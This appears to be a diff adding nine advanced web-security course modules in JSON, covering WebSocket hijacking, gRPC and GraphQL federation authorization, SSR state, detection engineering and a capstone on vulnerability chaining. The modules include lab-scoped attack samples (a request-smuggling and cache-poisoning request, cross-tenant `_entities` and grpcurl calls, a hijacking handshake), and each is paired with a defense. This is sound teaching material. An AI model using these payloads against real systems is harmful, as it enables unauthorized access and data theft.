+  {
+    "id": "web-security-advanced-42",
+    "topic": "web-security-advanced",
+    "number": 42,
+    "title": "Serverless and Edge Runtime Security Quirks",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how recycled execution contexts, embedded configuration, and edge/origin differences change web security assumptions.",
+    "objectives": [
+      "Detect state leakage across invocations",
+      "Audit bundles and environment exposure",
+      "Harden cache and header handling"
+    ],
+    "takeaways": [
+      "Module-scope state survives warm invocations",
+      "Bundles can leak secrets",
+      "Edge and origin see different request data"
+    ],
+    "practice": "In a local serverless function at <LAB_HOST>, store a marker in module scope and observe whether a later invocation sees it.",
+    "sources": [],
+    "content": "## Core idea\nServerless and edge runtimes recycle execution contexts. A function's module-scope variables may persist across warm invocations, so data written by one request can be read by another. That turns a seemingly harmless cache or global into a cross-user state leak. Other quirks include secrets accidentally bundled into client code, environment variables visible to any function, and differences between the edge proxy and the origin in how headers and client IPs are presented.\n\nThe mental model is a shared, recycled process with an ambiguous lifetime. Anything stored outside the request object may outlive the request. Incremental static regeneration and edge caches add another layer: a generated page may be stored and served to users who should not see its content if the cache key omits identity. Configuration mistakes such as trusting a client-supplied forwarded-for header are amplified when the edge is expected to overwrite it.\n\n### Step-by-step method (lab only)\n1. Map functions and routes at <LAB_HOST> and note which run at the edge versus the origin.\n2. Test module-scope state by writing a harmless marker in one invocation and reading it in another.\n3. Inspect client bundles for secrets, internal URLs, and environment values.\n4. Test cache keys for personalized pages across two owned accounts.\n5. Compare the request as seen at the edge and at the origin using a debug echo endpoint.\n\n### Concrete example\n```js\nlet cachedIdentity; // module scope, persists on warm invocations\nexport default async function handler(req) {\n  if (!cachedIdentity) cachedIdentity = req.headers['x-identity'];\n  return Response.json({ cachedIdentity });\n}\n```\nThe second caller receives the first caller's identity.\n\n| Quirk | Risk | Mitigation |\n|---|---|---|\n| Warm globals | Cross-request leak | Per-request state only |\n| Bundled secrets | Credential exposure | Server-only env |\n| ISR cache | Cross-user content | Identity in key |\n\n### Bypass and defense pairs\n- Bypass: reading a secret from a public bundle. Defense: use server-only environment variables and verify bundles before deployment.\n- Bypass: stale personalized page from cache. Defense: include identity in the cache key or disable caching for authenticated routes.\n\n### Additional surface\nCold starts change timing, which can break security tests that rely on consistent latency. They also mean a global cache may be empty on one invocation and populated on the next, so test repeatedly. Verify that internal function URLs are not directly reachable without passing through the edge.\n\n### Common mistakes\n- Assuming each invocation gets a fresh process.\n- Trusting edge-overwritten headers without verifying they are actually overwritten.\n- Logging full request bodies containing secrets.\n\n### Knowledge check\n**Q:** Why can a module-scope variable leak data between users?\n**A:** Because warm invocations reuse the same execution context, so state from an earlier request remains visible."
+  },
+  {
+    "id": "web-security-advanced-43",
+    "topic": "web-security-advanced",
+    "number": 43,
+    "title": "WebSocket Security and Cross-Site Hijacking",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Learn how the WebSocket upgrade bypasses same-origin policy and why authorization must be enforced per message.",
+    "objectives": [
+      "Validate upgrade origin and authentication",
+      "Test cross-site WebSocket hijacking in a lab",
+      "Enforce message-level authorization"
+    ],
+    "takeaways": [
+      "Origin is the only built-in cross-origin signal",
+      "Connection-time auth is insufficient",
+      "Tokens in URLs leak through logs"
+    ],
+    "practice": "Against a local WebSocket service at <LAB_HOST>, connect from an owned foreign origin and observe whether the handshake is accepted.",
+    "sources": [],
+    "content": "## Core idea\nA WebSocket begins with an HTTP upgrade, after which the connection is not governed by same-origin policy. The only built-in signal about the initiating page is the `Origin` header, so failing to validate it enables cross-site WebSocket hijacking. Authentication performed only at connection setup is also weak: a single long-lived socket may carry messages for many resources, and each message needs its own authorization decision. Tokens placed in the URL are particularly risky because they appear in logs, referrers, and browser history.\n\nThe mental model is a persistent authenticated channel. A browser page can open it silently, so consent is implicit. Once open, the attacker-controlled page can send arbitrary frames and read responses. If the server treats the socket's initial identity as blanket authorization, the attacker acts with the victim's privileges for the socket's lifetime.\n\n### Step-by-step method (lab only)\n1. Capture the upgrade request at <LAB_HOST> and record authentication and origin headers.\n2. Open the socket from an owned foreign origin and check whether the handshake succeeds.\n3. Test origin validation with lookalike domains and missing origins.\n4. Test whether a token is passed in the query string and whether it leaks in logs.\n5. Send messages referencing another user's object IDs and observe authorization.\n\n### Concrete example\n```http\nGET /ws?token=<TOKEN_A> HTTP/1.1\nHost: <LAB_HOST>\nUpgrade: websocket\nConnection: Upgrade\nOrigin: https://evil.example\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\n```\nIf the server ignores `Origin` and trusts the token in the URL, the attacker's page can drive the victim's socket.\n\n| Control | Weak | Strong |\n|---|---|---|\n| Origin check | Substring or absent | Exact allowlist |\n| Auth location | Query string | Header or cookie |\n| Message authz | Connection-time only | Per message |\n\n### Bypass and defense pairs\n- Bypass: origin header with a lookalike domain. Defense: exact comparison against an allowlist.\n- Bypass: sending a message with a foreign object ID. Defense: authorize each message against the session's identity.\n\n### Additional surface\nSubprotocol negotiation and compression extensions can introduce parser differences between proxy and application. Verify that the proxy forwards the same frames the application sees, and apply message size and rate limits to prevent memory exhaustion.\n\n### Common mistakes\n- Assuming same-origin policy applies after upgrade.\n- Treating a socket as inherently trusted once authenticated.\n- Using predictable tokens in URLs.\n\n### Knowledge check\n**Q:** Why is connection-time authorization insufficient for WebSockets?\n**A:** Because one socket can carry many requests for different resources; each message must be authorized against the current caller and object."
+  },
+  {
+    "id": "web-security-advanced-44",
+    "topic": "web-security-advanced",
+    "number": 44,
+    "title": "gRPC and Metadata Trust Boundaries",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study authorization and parsing issues in HTTP/2-based gRPC services and their REST transcoding gateways.",
+    "objectives": [
+      "Enumerate services and methods in a lab",
+      "Test metadata-based authentication",
+      "Compare gateway and native authorization"
+    ],
+    "takeaways": [
+      "Binary framing hides semantics from text-based controls",
+      "Metadata is attacker-controlled input",
+      "Per-method authorization is required"
+    ],
+    "practice": "In a local gRPC lab at <LAB_HOST>, use reflection to list services and call a method with modified metadata from an owned account.",
+    "sources": [],
+    "content": "## Core idea\ngRPC transports protobuf messages over HTTP/2 and carries authentication in metadata headers. Because payloads are binary, text-oriented proxies and WAFs may have little visibility into method names and arguments. Authorization must therefore be enforced inside the service per method, and metadata must be treated as untrusted input. Reflection, if exposed, makes service enumeration trivial, while REST-to-gRPC transcoding can create two paths with different authorization rules.\n\nThe mental model is two doors into one room. A REST gateway may enforce a policy that the native gRPC endpoint does not, or vice versa. Streaming methods add complexity because state can evolve across many messages, and a check performed on the first message may not hold later. Message size limits and flow-control settings are also security-relevant because they bound resource consumption.\n\n### Step-by-step method (lab only)\n1. Check whether server reflection is enabled at <LAB_HOST> and list services in your lab.\n2. Identify the metadata key used for authentication and test missing, duplicated, and forged values.\n3. Compare the same operation through the REST gateway and native gRPC.\n4. Test unary and streaming variants of a method for inconsistent authorization.\n5. Test oversized messages and streaming duration limits.\n\n### Concrete example\n```text\ngrpcurl -H \"authorization: Bearer <TOKEN_B>\" <LAB_HOST>:443 list\ngrpcurl -H \"authorization: Bearer <TOKEN_B>\" -d '{\"id\":\"1042\"}' \\\n  <LAB_HOST>:443 pkg.User/GetProfile\n```\nIf TOKEN_B receives user 1042's profile, the method lacks object-level authorization.\n\n| Surface | Risk | Control |\n|---|---|---|\n| Reflection | Service enumeration | Disable in production |\n| Metadata | Auth spoofing | Verify signed tokens |\n| Transcoding | Policy divergence | Shared auth layer |\n\n### Bypass and defense pairs\n- Bypass: calling the native method directly when the gateway enforces auth. Defense: enforce authorization in the service, not only the gateway.\n- Bypass: duplicate metadata keys that one layer deduplicates differently. Defense: reject duplicate auth metadata.\n\n### Additional surface\nHTTP/2 header compression and flow control interact with gRPC framing; apply the same desync discipline as for HTTP/2 generally. Ensure that TLS and ALPN configuration does not allow an unexpected protocol downgrade that routes around the service's controls.\n\n### Common mistakes\n- Assuming binary protocols are inherently safer.\n- Leaving reflection enabled in production.\n- Authorizing only at the transcoding gateway.\n\n### Knowledge check\n**Q:** Why can a REST gateway's authorization be bypassed through native gRPC?\n**A:** Because both are separate entry paths to the same service; if enforcement lives only in the gateway, direct gRPC calls skip it."
+  },
+  {
+    "id": "web-security-advanced-45",
+    "topic": "web-security-advanced",
+    "number": 45,
+    "title": "GraphQL Federation and Subgraph Authorization",
+    "level": "Advanced",
+    "minutes": 75,
+    "summary": "Examine how query planning and entity resolution can break authorization across federated subgraphs.",
+    "objectives": [
+      "Map gateway and subgraph trust boundaries",
+      "Test entity resolution for cross-tenant access",
+      "Enforce policy in every subgraph"
+    ],
+    "takeaways": [
+      "Authorization must travel with the query plan",
+      "Subgraphs must enforce policy independently",
+      "Entity resolvers are a cross-service join primitive"
+    ],
+    "practice": "In a local federated lab at <LAB_HOST>, call a subgraph directly and then through the gateway to compare authorization behavior.",
+    "sources": [],
+    "content": "## Core idea\nGraphQL federation splits one schema across subgraphs behind a gateway that plans and executes queries. The convenience hides a trust boundary: the gateway may enforce authorization while subgraphs assume requests are already trusted. If a subgraph is directly reachable, its policy disappears. Even through the gateway, entity resolution lets a query join objects across services using keys, which can become a cross-tenant data access primitive when keys are attacker-controlled.\n\nThe mental model is a distributed query plan with policy attached at the edges. Every hop must carry and revalidate the caller's identity. Directives that look declarative may be enforced only at the gateway, leaving subgraphs to return unauthorized fields. Query planning also amplifies cost: a single query can fan out to many subgraph calls, overwhelming a backend that the gateway's limits did not account for.\n\n### Step-by-step method (lab only)\n1. Map the gateway, subgraphs, and shared entities at <LAB_HOST> from schema and documentation in your lab.\n2. Attempt direct calls to each subgraph, bypassing the gateway.\n3. Query a sensitive field through aliases and fragments to test field-level policy.\n4. Use `_entities` with representations referencing another tenant's identifiers.\n5. Measure subgraph call counts for a deeply nested query.\n\n### Concrete example\n```json\n{\"query\":\"{ _entities(representations:[{__typename:\\\"User\\\",id:\\\"1042\\\"}]) { ... on User { email } } }\"}\n```\nIf the user subgraph returns the email without checking the caller, federation has become a cross-tenant join.\n\n| Boundary | Failure | Defense |\n|---|---|---|\n| Gateway only | Direct subgraph access | Auth in every subgraph |\n| Entity key | Cross-tenant join | Validate ownership |\n| Query plan | Fan-out amplification | Subgraph-level limits |\n\n### Bypass and defense pairs\n- Bypass: direct subgraph request with gateway-only auth. Defense: network-isolate subgraphs and authenticate at each one.\n- Bypass: representation with a foreign tenant key. Defense: verify entity ownership before resolving.\n\n### Additional surface\nShared fields marked as shareable can resolve in multiple subgraphs with different implementations, so one may enforce a policy the other omits. Test every resolver path for the same field. Also verify that JWT claims or identity headers are signed when passed from gateway to subgraph.\n\n### Common mistakes\n- Trusting internal network position as authorization.\n- Assuming directives are enforced everywhere.\n- Ignoring cost amplification across subgraph calls.\n\n### Knowledge check\n**Q:** Why is entity resolution a cross-tenant risk?\n**A:** Because it lets a caller supply keys that join data in another service; without ownership checks the gateway's policy is bypassed through the join."
+  },
+  {
+    "id": "web-security-advanced-46",
+    "topic": "web-security-advanced",
+    "number": 46,
+    "title": "SSR Hydration State and Server Action Abuse",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Study how server-rendered HTML carries serialized application state and how that state can be inspected or manipulated.",
+    "objectives": [
+      "Audit embedded state for sensitive data",
+      "Test server action argument tampering",
+      "Prevent cross-user cached HTML"
+    ],
+    "takeaways": [
+      "Hydration data is visible to every client",
+      "Serialized props are inputs, not trusted state",
+      "Personalized HTML must not be publicly cached"
+    ],
+    "practice": "On a local SSR page at <LAB_HOST>, inspect embedded JSON state with a test account and search for sensitive values.",
+    "sources": [],
+    "content": "## Core idea\nServer-side rendering improves performance by embedding initial state into HTML so the client can hydrate. That state is a serialized program input: anything placed there is visible to the browser and often mutable before hydration. Bugs include leaking secrets or internal objects into props, trusting hydrated values as authoritative, and caching personalized HTML under a public key. Server actions compound this by accepting arguments that the client can alter after render.\n\nThe mental model is a snapshot of server data shipped to the client. The snapshot is evidence of what the server once knew, not proof of what it should now allow. Hydration mismatches, where client and server render different outputs, can sometimes be used to desynchronize state or trigger unexpected code paths. Cache configuration determines who else receives the snapshot.\n\n### Step-by-step method (lab only)\n1. View the page source at <LAB_HOST> and locate embedded JSON scripts used for hydration.\n2. Search the serialized state for tokens, internal identifiers, and feature flags.\n3. Modify a harmless prop in the browser and observe whether the client trusts it.\n4. Replay a server action with altered arguments using your owned account.\n5. Fetch the same URL in a second account to test whether cached HTML leaks personalized data.\n\n### Concrete example\n```html\n<script id=\"__NEXT_DATA__\" type=\"application/json\">\n{\"props\":{\"user\":{\"id\":\"1042\",\"role\":\"admin\"},\"csrf\":\"...\"}}\n</script>\n```\nIf role is used for client-side decisions that the server also trusts, escalation follows.\n\n| Surface | Risk | Control |\n|---|---|---|\n| Serialized props | Data exposure | Allowlist fields |\n| Hydration mismatch | State desync | Deterministic render |\n| Shared cache | Cross-user HTML | Identity in key |\n\n### Bypass and defense pairs\n- Bypass: altering a prop that the server later trusts. Defense: revalidate every value server-side.\n- Bypass: public cache serving personalized HTML. Defense: mark authenticated routes private.\n\n### Additional surface\nError pages and streaming boundaries can leak different state than the main document. Check partial responses and suspended streams as well. Verify that feature flags intended for internal users are not shipped to everyone, since they reveal roadmap and enable probing of hidden endpoints.\n\n### Common mistakes\n- Assuming server rendering means data stays on the server.\n- Trusting client-side role checks that mirror server state.\n- Ignoring cache headers on HTML responses.\n\n### Knowledge check\n**Q:** Why are serialized props an input rather than trusted state?\n**A:** Because the browser receives them as text and can modify them; only server-side validation makes them trustworthy."
+  },
+  {
+    "id": "web-security-advanced-47",
+    "topic": "web-security-advanced",
+    "number": 47,
+    "title": "Building Regression Tests for Web Security Bugs",
+    "level": "Advanced",
+    "minutes": 45,
+    "summary": "Convert web vulnerability findings into durable automated tests that fail on the vulnerable code and pass on the fix.",
+    "objectives": [
+      "Reduce a finding to a testable invariant",
+      "Choose the right test layer",
+      "Integrate security tests into CI"
+    ],
+    "takeaways": [
+      "A regression test encodes a violated invariant",
+      "It must fail before and pass after the fix",
+      "Both positive and negative cases are needed"
+    ],
+    "practice": "In a local app at <LAB_HOST>, write a test asserting that conflicting length headers are rejected, run it before and after a fix.",
+    "sources": [],
+    "content": "## Core idea\nA security fix without a regression test is a temporary fix. The goal is to encode the invariant that was violated so a future change cannot silently reintroduce the bug. The mental model is a test as an executable specification: it should fail against the vulnerable version and pass against the fixed version. Reducing an exploit to its invariant is the hard part; the noisy exploit payload is usually unnecessary.\n\nChoose the layer that gives the fastest reliable signal. Parser and normalization bugs are best covered by unit tests. Authorization matrices need integration tests with two synthetic users. Protocol-level issues need harnesses that speak raw HTTP or H2. Property-based testing is valuable for normalization, because it can explore encodings you did not think of.\n\n### Step-by-step method (lab only)\n1. State the invariant in one sentence at <LAB_HOST>, such as \"conflicting length headers are rejected.\"\n2. Write a failing test that expresses the exploit at the smallest useful layer.\n3. Confirm it fails against the vulnerable build.\n4. Apply the fix and confirm the test passes.\n5. Add positive cases to ensure legitimate traffic still works, then wire the suite into CI.\n\n### Concrete example\n```python\ndef test_conflicting_length_headers_rejected(client):\n    raw = (b\"POST / HTTP/1.1\\r\\nHost: <LAB_HOST>\\r\\n\"\n           b\"Content-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\n\")\n    r = client.send_raw(raw)\n    assert r.status_code == 400\n```\nAn authorization matrix test:\n```python\nassert client_as_b.get(\"/api/users/1042/invoices\").status_code == 403\n```\n\n| Bug class | Test layer |\n|---|---|\n| Encoding differential | Unit / property |\n| BOLA matrix | Integration |\n| Desync | Raw protocol harness |\n| CSP | Browser-based check |\n\n### Bypass and defense pairs\n- Weak test: asserts a specific payload is blocked; strong test: asserts the invariant holds for a family of encodings.\n- Weak test: checks response status only; strong test: checks persisted state and side effects.\n\n### Additional surface\nKeep tests fast and deterministic; a flaky security test will be disabled. Use synthetic identities and fixed clocks. Tag tests by invariant rather than by CVE so they remain meaningful after software updates.\n\n### Common mistakes\n- Testing only the exact exploit string.\n- Forgetting legitimate traffic cases, causing false failures.\n- Leaving security tests out of the normal CI pipeline.\n\n### Knowledge check\n**Q:** Why should a regression test assert an invariant instead of a specific payload?\n**A:** Because variants of the same flaw use different payloads; an invariant catches the whole family."
+  },
+  {
+    "id": "web-security-advanced-48",
+    "topic": "web-security-advanced",
+    "number": 48,
+    "title": "Secure Defaults and Hardening Baselines",
+    "level": "Advanced",
+    "minutes": 45,
+    "summary": "Design configuration defaults that fail closed so developers do not have to remember to add security controls.",
+    "objectives": [
+      "Define a hardening baseline for web services",
+      "Turn off unsafe framework defaults",
+      "Add startup assertions"
+    ],
+    "takeaways": [
+      "Defaults are policies applied when nobody decides",
+      "Fail-closed beats fail-open",
+      "Configuration is code and must be reviewed"
+    ],
+    "practice": "In a local app at <LAB_HOST>, enable a deny-by-default authorization policy and confirm unregistered routes return 403.",
+    "sources": [],
+    "content": "## Core idea\nSecure defaults shift the burden from individual developers to the platform. A default is the policy that applies when nobody makes an explicit decision, so the safe choice should be automatic. Examples include deny-by-default authorization, framework autoescaping, strict XML parsers with external entities disabled, host-only cookies with prefixes, strict transport and framing headers, egress allowlists, and disabled debug endpoints.\n\nThe mental model is a baseline that every service inherits. Deviations require an explicit, reviewed exception. Without a baseline, security depends on each developer remembering each control on each endpoint, which fails at scale. Configuration files are therefore security artifacts: they deserve code review, version control, and tests just like source code.\n\n### Step-by-step method (lab only)\n1. Define a baseline checklist at <LAB_HOST> covering authz, parsing, headers, cookies, and logging.\n2. Compare deployed configuration to the checklist and record gaps.\n3. Disable debug modes, verbose errors, and unused endpoints.\n4. Enable hardening headers and strict parser settings.\n5. Add startup assertions that abort the process if a required control is missing.\n\n### Concrete example\n```text\nContent-Security-Policy: default-src 'none'; script-src 'self'; frame-ancestors 'none'\nSet-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/\nCache-Control: no-store\n```\nA startup assertion might check that the authorization middleware is registered before the router.\n\n| Default | Unsafe | Safe |\n|---|---|---|\n| Authorization | Allow by default | Deny by default |\n| XML parsing | External entities on | Disabled |\n| Errors | Verbose stack traces | Generic messages |\n| Cookies | Host and domain wide | Host-only with prefix |\n\n### Bypass and defense pairs\n- Unsafe default: a framework that auto-binds all request fields; safe default: explicit allowlists for input binding.\n- Unsafe default: permissive CORS reflection; safe default: static origin allowlist.\n\n### Additional surface\nBaselines must cover third-party components too: template engines, deserializers, and proxies each need safe settings. Automate the check so a new service cannot be deployed without inheriting it. Review exceptions periodically, since temporary debug settings tend to persist.\n\n### Common mistakes\n- Treating hardening as a one-time task.\n- Allowing debug endpoints in production \"just in case.\"\n- Assuming framework defaults are secure without verification.\n\n### Additional surface\nSecure defaults also include dependency and deployment hygiene: pin versions, remove unused plugins, and disable directory listings. Review exception requests as security decisions, with an owner and expiry date. Automate a baseline scan so a service cannot be deployed without inheriting the controls.\n\n### Knowledge check\n**Q:** Why is fail-closed authorization preferable to fail-open?\n**A:** Because an accidental omission denies access and is noticed, while fail-open silently exposes data."
+  },
+  {
+    "id": "web-security-advanced-49",
+    "topic": "web-security-advanced",
+    "number": 49,
+    "title": "Detection Engineering for Web Attacks",
+    "level": "Advanced",
+    "minutes": 60,
+    "summary": "Translate web attack techniques into observable log signals and build tuned, testable detections.",
+    "objectives": [
+      "Map attack primitives to telemetry",
+      "Write a detection with thresholds",
+      "Tune false positives safely"
+    ],
+    "takeaways": [
+      "Every exploit leaves a trace at some layer",
+      "Choose the highest-signal telemetry source",
+      "Detections need tests like code"
+    ],
+    "practice": "In a local lab at <LAB_HOST>, generate harmless request patterns and verify that a detection rule fires on them.",
+    "sources": [],
+    "content": "## Core idea\nDetection engineering turns knowledge of attack mechanics into alerts. The mental model is a trace map: every exploit leaves evidence somewhere  -  conflicting length headers at the proxy, unusual encodings at the WAF, authorization denials at the application, unusual child processes on the host. The best detection uses the layer where the signal is unambiguous and the event volume is manageable.\n\nStart from a technique, not from a log field. For request smuggling, the observable is a request with two length signals or a response ordering anomaly. For BOLA, it is a high rate of object identifiers that do not belong to the authenticated user. For SSRF, it is outbound connections to internal ranges triggered by a request. Write a rule with explicit conditions and a threshold, then validate it with harmless lab traffic that mimics the attack.\n\n### Step-by-step method (lab only)\n1. Inventory telemetry at <LAB_HOST>: proxy logs, application logs, WAF events, and host process events.\n2. For each attack primitive from earlier modules, list its observable event and source.\n3. Write a detection with clear conditions and a volume threshold.\n4. Generate harmless matching traffic in your lab and confirm the alert fires.\n5. Tune by adding exclusions for known legitimate patterns, then re-test.\n\n### Concrete example\n```yaml\ntitle: Conflicting request length headers\nsource: proxy_access_log\ndetection:\n  selection:\n    header_transfer_encoding: /chunked/i\n    header_content_length: /./\n  condition: selection\nfalse_positive_filter:\n  - upstream_rewrite: true\n```\nA BOLA detector might alert when one account requests more than N distinct object IDs in a short window.\n\n| Technique | Signal | Source |\n|---|---|---|\n| Desync | Dual length headers | Proxy |\n| SSRF | Internal outbound fetch | Egress logs |\n| SSTI | Template error strings | App logs |\n| BOLA | ID diversity per account | App logs |\n\n### Bypass and defense pairs\n- Attacker evasion: splitting headers across proxies; detection hardening: correlate at each hop.\n- Attacker evasion: low-and-slow enumeration; detection hardening: statistical baselines over longer windows.\n\n### Additional surface\nDetections should be versioned and tested in CI alongside application code. Alert fatigue is a real failure mode: prefer a few high-confidence rules over many noisy ones. Include a runbook that tells responders what to check first.\n\n### Common mistakes\n- Building rules directly from raw logs without a threat model.\n- Ignoring false positives until analysts disable the rule.\n- Alerting on a signal that the application itself cannot observe.\n\n### Knowledge check\n**Q:** Why should detections be tied to attack primitives rather than log fields?\n**A:** Because primitives describe what must be observable; starting from fields leads to rules that are noisy or miss the behavior."
+  },
+  {
+    "id": "web-security-advanced-50",
+    "topic": "web-security-advanced",
+    "number": 50,
+    "title": "Capstone: Chaining Five Web Vulnerabilities",
+    "level": "Advanced",
+    "minutes": 90,
+    "summary": "Synthesize the course by chaining a parser bug, cache poisoning, CSP bypass, object-level flaw, and server-side injection in a lab.",
+    "objectives": [
+      "Model vulnerabilities as capability primitives",
+      "Order a chain by preconditions",
+      "Document and verify each link"
+    ],
+    "takeaways": [
+      "Each bug supplies a precondition for the next",
+      "Chains break at their weakest link",
+      "Defense can target any single link"
+    ],
+    "practice": "In a fully owned lab at <LAB_HOST>, build the five-step chain with harmless markers and document the evidence for each transition.",
+    "sources": [],
+    "content": "## Core idea\nReal impact often comes from chaining. The mental model is a capability graph: each vulnerability provides a primitive, and each subsequent vulnerability requires a precondition that an earlier primitive satisfies. A request smuggling bug yields control over a shared cache entry. Cache poisoning yields attacker-controlled script on a trusted origin. A weak CSP permits that script to run. A BOLA flaw lets the script read another user's data or trigger a privileged endpoint. A server-side template injection on that endpoint turns data access into code execution.\n\nThe chain is only as strong as its least reliable link, so order matters. Choose steps that work deterministically and avoid relying on user interaction where possible. Each step must be verified independently before chaining; debugging a five-link chain without isolating links is painful and error-prone.\n\n### Step-by-step method (lab only)\n1. Enumerate the primitives available in your owned lab at <LAB_HOST> and their preconditions.\n2. Order them so each step supplies what the next needs.\n3. Verify each link in isolation with a harmless marker.\n4. Combine the links, recording request and response evidence at each transition.\n5. Write up the chain as a capability diagram and identify the single defense that would break it.\n\n### Concrete example\n```http\nPOST / HTTP/1.1\nHost: <LAB_HOST>\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nGET /static/app.js HTTP/1.1\nHost: <LAB_HOST>\nX-Poison: marker\n```\nThe poisoned script is served under a trusted origin, a reused nonce allows it to execute, it calls a BOLA-protected export endpoint, the export renderer injects a template, and the resulting process can reach an internal metadata service.\n\n| Link | Primitive supplied | Next requirement |\n|---|---|---|\n| Desync | Cache write | Trusted origin content |\n| CSP bypass | Script execution | Client-side call |\n| BOLA | Cross-user data | Privileged input |\n| SSTI | Code execution | Internal access |\n\n### Bypass and defense pairs\n- Chain-breaking defense: strict framing validation removes the first link, collapsing the chain.\n- Chain-breaking defense: per-response nonces and no unkeyed cache inputs prevent attacker script from ever being trusted.\n\n### Additional surface\nDocument alternatives: if one link is patched, is there a substitute? A mature assessment reports multiple paths to the same impact. Keep every test inside the owned lab and use harmless markers throughout.\n\n### Common mistakes\n- Assuming impact requires exploiting every link in a single request.\n- Failing to verify each link independently.\n- Stopping at the first interesting bug instead of following the capability graph.\n\n### Knowledge check\n**Q:** Why can one strong defense break an entire chain?\n**A:** Because later links depend on a precondition supplied by an earlier one; removing that prerequisite makes the remaining steps unreachable."
+  }
+]
